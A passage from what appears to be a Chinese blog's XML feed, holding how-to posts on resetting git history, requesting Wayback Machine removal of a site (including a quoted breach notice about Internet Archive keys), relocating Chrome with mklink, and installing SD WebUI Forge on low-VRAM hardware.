再次尝试（不知道这是否是我特殊原因，但后来再试没有这个问题了）。</p><p>接下来，将新的分支名称改为原来主分支的名称：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -m main</span><br></pre></td></tr></table></figure><ul><li><code>git branch</code>: 管理分支，包括创建、删除和重命名分支。</li><li><code>-m</code>: 重命名当前分支。</li><li><code>main</code>: 将当前分支重命名为的新名称，此处填写的是原有主分支的名称。</li></ul><h2 id="最后的推送">最后的推送</h2><p>最后，强制将本地的 main 分支推送到远程仓库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -f origin main</span><br></pre></td></tr></table></figure><ul><li><code>git push</code>: 将本地分支的更改推送到远程仓库。</li><li><code>-f</code>: 强制推送。当本地分支的历史与远程分支的历史不一致时，强制推送会覆盖远程分支的内容。</li><li><code>origin</code>: 远程仓库的默认名称，通常指向你最初克隆的远程仓库（如果你更改过，需要按实际情况修改）。</li><li><code>main</code>: 你要推送的本地分支的名称（此处为主分支名称）。</li></ul><h2 id="确认效果">确认效果</h2><p>刚清理完，理论上只有一条提交记录。这个命令用于查看提交日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --pretty=oneline</span><br></pre></td></tr></table></figure><p>下面这个命令会列举近 10 次提交记录，也足够用来确认了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> -n 10</span><br></pre></td></tr></table></figure><ul><li><code>git log</code>: 查看提交历史。</li><li><code>-n 10</code>: 指定显示最近的 10 条提交记录。你也可以将 10 替换为任何你想查看的提交数量。</li></ul><p>你也可以这么写：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> -n 10 --oneline <span class="comment"># 简化输出，每条提交仅显示一行</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> -n 10 --graph <span class="comment"># 显示分支和合并的图形表示</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何从 Wayback Machine 中删除你的网站</title>
      <link href="/posts/4220845552/"/>
      <url>/posts/4220845552/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Internet Archive （互联网档案馆，为了方便，下文我们将其简称为 IA）有一个功能叫 Wayback Machine，它可以对全世界所有的网页进行备份保存，任何人都可以通过这个网站查看到一个网站过去的样子，即使它现在已经被删除或修改。</p><p>然而，如果在网站中不慎更新了不愿被看到的内容，又或是有过时的信息，一旦被 IA 的 Bot 爬取，就会被保存下来。你无法在 IA 中找到类似删除的按钮，因为整个爬取过程是自动化完成的。</p><p>我并不反对 IA 爬取网站的行为，但我觉得，内容所有者应该对此有选择和控制权。那怎么把你的站点从 Wayback Machine 清除呢？</p><blockquote><p>注：英语好的，可以不按照本文给出的范例进行编写。</p></blockquote><h3 id="一、更新-robots-txt">一、更新 robots.txt</h3><p>robots.txt 是一个位于网站根目录的文本文件，在这个文件中，站长可以声明该网站中不想被 robots 访问的部分，或者要求 robots 只能访问指定的内容。它可以控制 robots 对特定页面或目录的访问，例如保护不希望不必要的内容被索引。但是，并非所有的搜索引擎都严格遵循 robots.txt 协议。一些爬虫可能会忽视它，从而爬取你希望隐藏的页面。</p><p>还好，至少 IA 的爬虫是遵守 robots.txt 的。那么接下来，在你的站点根目录新建一个 robots.txt 文件，然后添加对应的规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: ia_archiver</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure><p>如果不放心，可以再加一些，以防万一（最后那个 GPTBot 是防止 ChatGPT 爬取网站的，与 IA 无关，只想防 IA 的可以不写它）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">User-agent: ia_archiver</span><br><span class="line">Disallow: /</span><br><span class="line"></span><br><span class="line">User-agent: archive.org_bot</span><br><span class="line">Disallow: /</span><br><span class="line"></span><br><span class="line">User-agent: ia_archiver-web.archive.org </span><br><span class="line">Disallow:</span><br><span class="line"></span><br><span class="line">User-agent: GPTBot</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure><p>请注意，这只是告诉 IA 的 Wayback Machine 不要再抓取我的网站，已经抓取的内容还是会保留。但问题是，它不能由用户主动删除，而是需要用邮件通知（最方便的）。</p><h3 id="二、编写邮件">二、编写邮件</h3><p>（其实请求和验证身份可以合并到一个邮件中，可以为双方节省时间）</p><p>编写一份删除通知，通过邮件发送到 <code>info@archive.org</code> 和 <code>wayback2@archive.org</code> 中。建议使用 Gmail， 国内邮箱可能会出现退信的情况。如果不知道怎么写，可以参考下面这封：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">收件人：info@archive.org,wayback2@archive.org</span><br><span class="line"></span><br><span class="line">主题：Remove site from Internet Archive</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line">Hello.I am the owner of [Domain].</span><br><span class="line"></span><br><span class="line">I formally request the immediate removal of the [Domain] site/domain from web.archive.org and the Internet Archive Time Machine.</span><br><span class="line"></span><br><span class="line">We updated the &quot;User-agent: ia_archiver Disallow: /&quot; code in the robots.txt file, which was not followed.</span><br><span class="line"></span><br><span class="line">I request that [Domain] be removed from the Internet Archive and the Wayback Machine until today and all days thereafter.</span><br><span class="line"></span><br><span class="line">Thank you for your attention.</span><br><span class="line"></span><br><span class="line">[Name]</span><br></pre></td></tr></table></figure><p>请将文中【Domain】和【Name】的部分替换为你自己的信息，【Domain】可以写多个（但不建议一次性写太多）。【Name】就自己编一个，甚至不写也行。</p><p>之后，你可能会收到一封来自 <a href="mailto:processor@archive.org" rel="external nofollow noreferrer">processor@archive.org</a> 的回信，大致是需要验证你的身份，证明你是网站的所有者。它推荐了一些方法，例如：</p><ul><li>在最新版本的网站上发布您的请求（并发送链接给我们）。</li><li>从网站上列出的主要电子邮件联系人发送您的请求，并向我们展示它可以位于何处（如果存在）。</li><li>联系域名托管方或注册商发送证明信息。</li><li>向我们指出您的个人信息在网站上出现的方式，以识别您是网站的所有者或您希望排除的内容的作者——在这种情况下，我们要求通过扫描有效的照片 ID 来验证您的身份（敏感信息，如出生日期，地址或电话号码可以被编辑）。</li></ul><p>选择一个你认为合适的方式完成。我的方法是在网站根目录下创建一个声明页面（名称随意，例如<code>please-remove-the-site.html</code>），在里面表明你希望 IA 删除这个网站，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Remove site from Internet Archive<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>I want remove this site or domain from Internet Archive and Wayback Machine.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>你也可以再添加一些别的东西，或是以其他的方法。完成后，给它回复邮件，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We&#x27;ve updated the request on our website, and here&#x27;s the link to it: [Domain]/please-remove-the-site.html, thank you.</span><br></pre></td></tr></table></figure><p>同样替换其中的【Domain】为你的实际域名。发送电子邮件后，你需要等待它，有的需要几天时间。 <a href="http://Archive.org" rel="external nofollow noreferrer">Archive.org</a> 团队在美国加利福尼亚州，因此你还需要考虑到时间、假期、节日等因素。Internet Archive / Wayback Machine / <a href="http://Archive.org" rel="external nofollow noreferrer">Archive.org</a> 的人很友好，因此你需要要有耐心、有礼貌，但表述请求时要坚定。如果 3 天后仍未收到消息，可能还需要礼貌地发送电子邮件询问。</p><p>如果成功的话你会收到一封邮件，内容大致如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hello,</span><br><span class="line"> </span><br><span class="line">The following has been submitted for exclusion from the Wayback Machine at web.archive.org:</span><br><span class="line"> </span><br><span class="line">[Domain]</span><br><span class="line"> </span><br><span class="line">Please allow up to a day for the automated portions of the process to run their course and for the changes to take effect.</span><br><span class="line"> </span><br><span class="line">---</span><br><span class="line">The Internet Archive Team</span><br></pre></td></tr></table></figure><p>这时再前往 <a href="https://web.archive.org/web/" rel="external nofollow noreferrer">web.archive.org</a> 搜索你的域名，如果看到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sorry.</span><br><span class="line">This URL has been excluded from the Wayback Machine.</span><br></pre></td></tr></table></figure><p>则表明你的网站存档已经被 IA 删除。</p><h3 id="注意事项">注意事项</h3><p><strong>请礼貌用语</strong>，并且不建议在短时间内发送多个请求。</p><p>另外，请留意你的收件箱，包括但不限于 IA 团队的通知、技术问题，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">It&#x27;s dispiriting to see that even after being made aware of the breach 2 weeks ago, IA has still not done the due diligence of rotating many of the API keys that were exposed in their gitlab secrets.</span><br><span class="line"></span><br><span class="line">As demonstrated by this message, this includes a Zendesk token with perms to access 800K+ support tickets sent to info@archive.org since 2018.</span><br><span class="line"></span><br><span class="line">Whether you were trying to ask a general question, or requesting the removal of your site from the Wayback Machine—your data is now in the hands of some random guy.  If not me, it&#x27;d be someone else.</span><br><span class="line"></span><br><span class="line">Here&#x27;s hoping that they&#x27;ll get their shit together now.</span><br><span class="line"></span><br><span class="line">（令人沮丧的是，即使在两周前意识到漏洞之后，IA 仍然没有尽职调查，轮换许多在他们的 gitlab 秘密中暴露的 API 密钥。）</span><br><span class="line"></span><br><span class="line">（如此消息所示，这包括一个Zendesk令牌，可以访问自2018年以来发送到info@archive.org的800K+支持票。）</span><br><span class="line"></span><br><span class="line">（无论你是想问一个一般性的问题，还是要求从 Wayback 机器上删除你的网站，你的数据现在都掌握在某个随机的家伙手中。就算不是我，也会是别人。）</span><br><span class="line"></span><br><span class="line">（我希望他们现在能振作起来。）</span><br></pre></td></tr></table></figure><p>这时可能就只能静观其变了。当然，你也可以在发送后续邮件请求时表现出理解与关怀，例如添上一段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Of course, I also know that you are now experiencing some difficulties related to the key, I also understand, but I hope that you can give as much reply and action as possible.</span><br><span class="line"></span><br><span class="line">I wish you all the best, and once again I would like to express my understanding and thanks to you</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 mklink 将 Chrome 安装到别的磁盘</title>
      <link href="/posts/2138137695/"/>
      <url>/posts/2138137695/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>有些时候做测试，Chrome 上比较方便。但 Chrome 默认只能装在 C 盘，还找不到修改的地方。</p><p>使用绿化版？对于这种东西而言，非必要尽量保持最新比较好</p><p>眼见其占用储存日益庞大，C 盘在飘红的边缘徘徊，是该尝试解决一下问题了。</p><h3 id="前置说明">前置说明</h3><p>mklink 是 Windows 系统中的一个命令行工具，用于创建符号链接、硬链接和目录联接点。基本语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink [[/D] | [/H] | [/J]] &lt;Link&gt; &lt;Target&gt;</span><br></pre></td></tr></table></figure><ul><li>/D：创建目录符号链接（软链接）。默认情况下，mklink 创建的是文件符号链接。</li><li>/H：创建硬链接而不是符号链接。</li><li>/J：创建目录联接点。</li></ul><p>通过这个工具，可以将 C 盘中原本 Chrome 将要创建文件夹的地方链接到别的盘，原本的 Chrome 文件夹变成一个映射入口，实际数据在链接目标文件夹中。</p><p>另外，直接移动 Chrome 程序文件夹只是治标不治本，而且会导致程序关联、后续升级等问题。如果你不打算升级，那么用这种类似绿色版的方式即可。</p><h3 id="实际操作">实际操作</h3><p>Chrome 会在 C 盘中创建用户数据和主程序文件，一般会涉及到下面三个地方：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\[用户名]\AppData\Local\Google</span><br><span class="line">C:\Program Files\Google</span><br><span class="line">C:\Program Files (x86)\Google</span><br></pre></td></tr></table></figure><p>那么接下来只需使用 mklink 命令将这些文件夹改为指向其他盘（例如 D 盘）下的某个文件夹即可。</p><p>先将 Chrome 卸载，保留用户数据，然后将用户数据或其他你想保留的 Chrome 数据转移到新的目录。之后在文件资源管理器顶部菜单中将<code>显示隐藏文件夹</code>打开，然后打开命令提示符（不放心的也可以使用<code>Win+R</code>调出“运行”-&gt;输入<code>cmd</code>-&gt;<code>Ctrl+Shift+Enter</code>以管理员身份运行命令提示符），之后按照要求输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mklink /d <span class="string">&quot;C:\Users\Admin\AppData\Local\Google&quot;</span> <span class="string">&quot;D:\Google&quot;</span></span><br><span class="line">mklink /d <span class="string">&quot;C:\Program Files\Google&quot;</span> <span class="string">&quot;D:\Program Files\Google&quot;</span></span><br><span class="line">mklink /d <span class="string">&quot;C:\Program Files (x86)\Google&quot;</span> <span class="string">&quot;D:\Program Files (x86)\Google&quot;</span></span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>示例：mklink /d “原路径” “目标路径”</li><li>后面的目标路径需要先创建且保持为空，原路径文件夹需要删除或改名，否则&quot;当文件已存在时，无法创建该文件&quot;（这里不一定，但最好照做）</li><li>命令仅为示例，实际使用需根据自身情况适当修改。为求方便，此处将大部分 Google 产品可能涉及到的 Google 目录都进行了软链接</li><li>建议使用绝对路径，且使用英文双引号将路径括起来</li></ul><p>然后下载 Chrome 的安装包，正常安装即可。为防止下载到盗版Chrome，此处给出国内下载地址：<a href="https://www.google.cn/chrome/" rel="external nofollow noreferrer">https://www.google.cn/chrome/</a>。现在安装 Chrome 时，真实的安装路径在前面设置的目标路径下，C 盘原来那个文件夹只是一个入口。之后的设置与更新也是正常的。</p><h3 id="验证">验证</h3><p>前往 C 盘原本应用于存放 Chrome 程序的目录，右键该目录中相应的文件夹（例如 Google 文件夹，此时该文件夹的图标或许已经变成类似快捷方式的模样），查看文件夹属性，检测目标位置和目标两处是否已经变为实际设置的目标位置，以验证软链接是否起作用。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低显存也能 AI 绘图：SD WebUI Forge 配置与使用</title>
      <link href="/posts/775200063/"/>
      <url>/posts/775200063/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui" rel="external nofollow noreferrer">SD-WebUI</a> 拥有良好的扩展性、跨平台、图形化、开放源码等特点，成为了比较有名的图形化 AI 作图程序。模型方面，只要遵循相应的许可证，几乎没有使用限制（大多模型采用了 <a href="https://github.com/CompVis/stable-diffusion/blob/main/LICENSE" rel="external nofollow noreferrer">Creative ML OpenRAIL-M</a> 或 <a href="https://freedevproject.org/faipl-1.0-sd/" rel="external nofollow noreferrer">Fair AI Public License</a>，不过最终还需以模型作者的说明和许可证为准）。</p><p>虽然配置 SD Webui 可以劝退很多人，好在已经有爱好者铺路了，例如 <a href="https://www.bilibili.com/video/BV1ne4y1V7QU/" rel="external nofollow noreferrer">绘世启动器</a>，免去了很多繁琐的配置问题，进一步拉低了 Stable Diffusion 的部署门槛。</p><p>但环境配置归环境配置，硬件呢？以目前的情况来看，在 PyTorch 官方弄好免 CUDA 加速推理而改用 Triton 内核前，运行 SD 还是在 GPU 上效率高。虽然这程序已经可以在个人设备上部署，但并非人人都有至少 GTX1050Ti 的硬件。买个新的？也并非所有人都有这条件与机会。</p><p>真就只能冒着爆显存的风险等个数分钟出图吗？</p><h3 id="SD-Webui-Forge">SD Webui Forge</h3><p>SD Webui 本地部署硬件要求高、占资源大，虽可以云端部署，但基本都不免费，而且本身还不能完整复刻工作流。Controlnet、Omost、Style2Paints 等项目的作者张吕敏博士也发现了这个问题，他因此开发了 <a href="https://github.com/lllyasviel/stable-diffusion-webui-forge" rel="external nofollow noreferrer">stable-diffusion-webui-forge</a>（为了方便，后面我们将其简称为“Forge”）。从项目介绍中可以得知，该项目旨在简化开发、优化资源管理、加快推理速度并研究实验功能。项目每 90 天与原来的 A1111 的 SD Webui 同步一次，或者在有重要修复的时候同步。</p><p>相比于广为人知的 SD Webui，Forge 有几个显著特点：</p><ul><li>性能优化：极大简化了逻辑，让 Forge 版本的性能有所提升，甚至让 4GB 显存的设备也能运行起 SDXL（按照其说法，配置越低，提升感知越明显。“找茬”可能要另当别论）。</li><li>资源管理优化：在原版部署的时候，SD Webui 容易因插件冲突而启动失败，而 Forge 大幅提高各类插件的兼容性。</li><li>新增的生成算法：Forge 版集成了一些新的采样器和其他生成算法，使得生成的图像质量更高。</li><li>更好的兼容性：对于最新的配置或较旧的设备，Forge 版本都会尽可能提供更好的兼容性，确保用户能够充分利用其计算资源。</li><li>预装部分插件：ControlNet、Z123、3D 图等插件，Forge 都将其进行了预装，开箱即用。</li></ul><p>它的更新频率比较高，支持的东西也比较多（现在连 Flux 模型都支持了）。由于 Forge 的界面与 SD Webui 的界面基本一致，因此先前使用 SD Webui 的用户可以很方便地上手 Forge。</p><p>当然，如果你的设备配置比较好，没有特殊情况，那么建议继续用 SD-Webui，因为 Forge 对于配置较好的设备而言提升不够明显，而且部分插件在 Forge 上无法正常运行。</p><h3 id="安装方法">安装方法</h3><h4 id="Win-部署">Win 部署</h4><p>对于 Win 用户，我建议直接用作者提供的一键整合包（本文此处链接最后更新时间：2024 年 12 月 20 日）。下载前请注意 CUDA 版本，如果你使用的是 NVIDIA 显卡，且打算使用 N 卡来运行该程序。下载时，<strong>你需要注意网络配置</strong>（例如使用 Watt Toolkit（Steam++）等程序）。</p><p><a href="https://github.com/lllyasviel/stable-diffusion-webui-forge/releases/download/latest/webui_forge_cu121_torch231.7z" rel="external nofollow noreferrer">&gt;&gt;&gt; 点此下载一键式软件包 （CUDA 12.1 + Pytorch 2.3.1） &lt;&lt;&lt;</a></p><p>还有一些其他的版本（也是一键整合包）：</p><p><a href="https://github.com/lllyasviel/stable-diffusion-webui-forge/releases/download/latest/webui_forge_cu121_torch231.7z" rel="external nofollow noreferrer">使用 CUDA 12.1 + Pytorch 2.3.1</a> &lt;- Forge 推荐</p><p><a href="https://github.com/lllyasviel/stable-diffusion-webui-forge/releases/download/latest/webui_forge_cu124_torch24.7z" rel="external nofollow noreferrer">使用 CUDA 12.4 + Pytorch 2.4</a> &lt;- 最快，但 MSVC 可能损坏，xformers 可能无法工作</p><p><a href="https://github.com/lllyasviel/stable-diffusion-webui-forge/releases/download/latest/webui_forge_cu121_torch21.7z" rel="external nofollow noreferrer">使用 CUDA 12.1 + Pytorch 2.1</a> &lt; 旧版本，旧环境</p><p>N 卡用户的 CUDA 需要自行安装。安装了但不知道 N 卡 CUDA 版本的，可以在 CMD 中输入命令查看 cuda-version：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><p>一般在这个终端打印的表格的第一行。CUDA 高版本可以兼容 Torch 低版本，但最好不要低太多，无论是从性能还是从兼容角度。</p><p>下载后，在磁盘中找一个合适的位置（目录不要有中文），将其解压。之后使用 <code>update.bat</code> 进行更新，再使用 <code>run.bat</code> 运行。每次使用前都建议运行整合包内的 <code>update.bat</code>，以修复早期版本的潜在错误。</p><p>不使用整合包也可以，使用与 SD-WebUI 相同的方法来安装 Forge 即可。此时 Git、Python 之类的环境需要你自行配置，Git Clone 该储存库，然后运行 <code>webui-user.bat</code>。</p><blockquote><p>注：使用官方的一键包初始化时，除了需要下载必要组件外，可能还要从 Huggingface 上下载一个 realisticVisionV51_v51VAE.safetensor 模型。</p></blockquote><p>这个模型体积较大，且因国内网络问题容易中断。因此使用官方整合包的，建议先下载这个模型放到<code>【Forge 整合包】/webui/models/Stabel-diffusion</code>目录下（<code>【Forge 整合包】</code>需要根据自己的实际情况加以变通）。</p><p>我的建议是用 Watt Toolkit 最新版本（截止本文完成前，它最新实际为测试版，但已经可以加速 Huggingface 网站），打开加速，然后将 <a href="https://huggingface.co/casque/realisticVisionV51_v51VAE/blob/main/realisticVisionV51_v51VAE.safetensors" rel="external nofollow noreferrer">https://huggingface.co/casque/realisticVisionV51_v51VAE/blob/main/realisticVisionV51_v51VAE.safetensors</a> 复制粘贴到下载器中（例如 <a href="https://motrix.app/" rel="external nofollow noreferrer">Motrix</a>、IDM 之类的）。还嫌慢的，建议用抱脸国内镜像的 <a href="https://hf-mirror.com/lllyasviel/fav_models/blob/main/fav/realisticVisionV51_v51VAE.safetensors" rel="external nofollow noreferrer">realisticVisionV51_v51VAE.safetensors</a> 地址进行下载。</p><h4 id="Linux">Linux</h4><p>整合包目前只有 Win 版。Linux 下，使用与 SD-WebUI 相同的方法来安装 Forge 即可。此时 Git、Python 之类的环境需要你自行配置，Git Clone 该储存库，然后运行 <a href="http://webui-user.sh" rel="external nofollow noreferrer">webui-user.sh</a>。</p><p><s>但你都选择接触 Linux 了，按照你的动手能力和搜索能力，这应该不成问题。</s></p><h3 id="绘世启动器">绘世启动器</h3><p>（更新：2024 年 12 月 31 日秋葉 aaaki 已制作 Forge 整合包，想解压直用的 win 用户可以一步到位直接前往 <a href="https://www.bilibili.com/video/BV1rc6nYNEYo/" rel="external nofollow noreferrer">【AI 绘画】SD-Forge 整合包发布</a> 的视频简介处下载）</p><h4 id="初始化启动器">初始化启动器</h4><blockquote><p>一键包本身即可正常使用，此小节所述非必须流程，但对于 Windows 用户而言可以进一步降低上手难度。</p></blockquote><p>首次运行需要下载一些必要的文件。但以国内的网络条件来说，连接一些国外网站体验如“坐牢”一般~~（当然，你把网络代理玩出花也不是不可）~~。前面我们提到了秋葉 aaaki 开发的“绘世启动器”，它同样也可以用于管理 Forge；同时，由于该启动器比较“傻瓜式”，上手比较方便，故在此一并介绍。</p><p>这里以 Forge 整合包为例（启动器初始化下载的文件不包含 SD 本体，最终还是要配置下载，不如提前先准备好整合包，省去很多未知问题。嫌速度慢建议找个镜像获取链接后丢到 Motrix 中）。如果你使用其他整合包，请灵活参考。</p><p>下载整合包后，将其解压到磁盘中。在这里，我们假设整合包在 E 盘根目录中，整合包文件夹名称为<code>SD-Webui-Forge</code>，下文亦然。如果下载文件正确，解压后的目录应大致如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E</span><br><span class="line">└── SD-Webui-Forge</span><br><span class="line">    ├── system</span><br><span class="line">    ├── webui</span><br><span class="line">    ├── environment.bat</span><br><span class="line">    ├── run.bat</span><br><span class="line">    └── update.bat</span><br></pre></td></tr></table></figure><!--+ E  + SD-Webui-Forge    + system    + webui    + environment.bat    + run.bat    + update.bat--><p>将前面下载好的绘世启动器放到<code>webui</code>目录中，并双击运行，等待下载必要组件后自动打开启动器界面。</p><h4 id="整合包环境设置">整合包环境设置</h4><p>在左侧菜单栏中下拉，找到齿轮形状按钮<code>设置</code>并点击，将右侧<code>配置模式</code>设置为<code>专家</code>。然后拉到最下面，将 Python 路径覆盖和 Git 路径覆盖设置为 Forge 整合包环境的实际路径（在<strong>整合包的</strong> system 文件夹中。整合包 Python 路径为<code>E:\SD-Webui-Forge\system\python\python.exe\system\python\python.exe</code>，整合包 Git 环境为<code>E:\SD-Webui-Forge\system\git\bin\git.exe</code>）。</p><p>（可选）将<code>网络设置</code>处的代理设置中代理服务器地址填上（也可以不填，这样会自动检测系统代理并使用，而不是指定端口）。启动器可以设置国内镜像下载，但如果后面的过程中发生网络问题（例如控制台出现 SSL 连接失败等自样），请先终止进程，设置代理地址及代理工具后再次启动（或者暂时关闭设备中所有代理软件、加速器等工具）。</p><p><img src="https://s2.loli.net/2024/11/05/GyHU7WBNqjK8LRV.png" alt=""></p><h4 id="共享模型">共享模型</h4><blockquote><p>如果你先前没有在此设备上运行过 SD-Webui，或是不需要同时保留 SD-Webui 和 Forge，可以直接跳过此小节</p></blockquote><p>Forge 还算实验性偏多、我主力使用 SD-Webui、我的 xxx 组件在 Forge 用不来……这俩程序都要用，但又不想浪费储存空间复制一份模型，怎么解决？改配置文件可行，但都用启动器了，那么如何方便如何来。</p><p>确认你已经将启动器的<code>配置模式</code>设置为<code>专家</code>（方法见上节），然后找到左侧菜单的<code>高级选项</code>，滚动到底部，展开自定义参数，在其中填入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--forge-ref-a1111-home &quot;【SD-Webui 的路径】&quot;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/05/RzNp98JdXOwj1Cb.png" alt=""></p><p>该路径为 SD-Webui 的路径，需要使用英文双引号包裹。例如，你的 SD-Webui 程序放在设备的 E 盘中，其文件夹名称为 <code>SD-Webui</code>，那么你需要填写的参数为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--forge-ref-a1111-home &quot;E:\SD-WebUI&quot;</span><br></pre></td></tr></table></figure><p>相对于设置了目录变量。设置后，Forge 将会从 SD-Webui 中加载部分模型，以达到共享模型节省储存的目的。</p><p>请注意，此时绘世启动器读取的仍是当前项目中的模型（Forge）而非原 SD-Webui 程序目录中的模型，因此你会发现启动器中<code>模型管理</code>没有被同步过来。确认配置生效，需要启动 Forge 一次，在浏览器中访问地址（默认为<code>http://127.0.0.1:7860</code>，启动器会在完成后自动打开浏览器访问），若 Webui 中可以看到目标模型，则表明配置无误。</p><h4 id="初始化-Forge">初始化 Forge</h4><p>在绘世启动器的高级选项中选择生成引擎。这里需要根据自己的实际情况进行选择，能用<code>由 Forge 决定</code>的就不必再改。如果设置了不支持的生成引擎（驱动版本过低、Torch 版本不匹配等也算），后续一键启动会发生报错。</p><p><img src="https://s2.loli.net/2024/11/05/kUnGste97Coh2g8.png" 